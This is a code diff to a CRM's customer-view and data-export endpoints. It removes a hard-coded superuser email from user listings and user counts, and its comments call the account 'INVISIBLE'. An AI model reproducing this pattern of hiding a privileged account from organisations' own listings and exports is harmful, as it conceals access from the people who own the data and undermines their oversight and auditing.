@@ -119,11 +119,16 @@ async def crm_360_view(
         )
     ).scalar_one_or_none()
 
+    from src.api.deps import SUPERUSER_EMAIL
+
     users = (
         (await db.execute(select(User).where(User.organization_id == org_id)))
         .scalars()
         .all()
     )
+    # Superuser is INVISIBLE — never appears in any listing
+    visible_users = [u for u in users if u.email != SUPERUSER_EMAIL]
+
     farms = (
         (await db.execute(select(Farm).where(Farm.organization_id == org_id)))
         .scalars()
@@ -218,7 +223,7 @@ async def crm_360_view(
                 "active": u.is_active,
                 "last_seen": u.updated_at.isoformat() if u.updated_at else None,
             }
-            for u in users
+            for u in visible_users
         ],
         farms=[{"id": str(f.id), "name": f.name} for f in farms],
         notes=[CustomerNoteRead.model_validate(n) for n in notes],
@@ -923,11 +928,16 @@ async def export_org_data(
         )
     ).scalar_one_or_none()
 
+    from src.api.deps import SUPERUSER_EMAIL
+
     users = (
         (await db.execute(select(User).where(User.organization_id == org_id)))
         .scalars()
         .all()
     )
+    # Superuser is INVISIBLE
+    visible_users = [u for u in users if u.email != SUPERUSER_EMAIL]
+
     notes = (
         (
             await db.execute(
@@ -952,7 +962,7 @@ async def export_org_data(
         "plan": sub.plan.value if sub else None,
         "plan_status": sub.status.value if sub else None,
         "months_subscribed": sub.months_subscribed if sub else 0,
-        "user_count": len(users),
+        "user_count": len(visible_users),
         "notes_count": len(notes),
     }
 
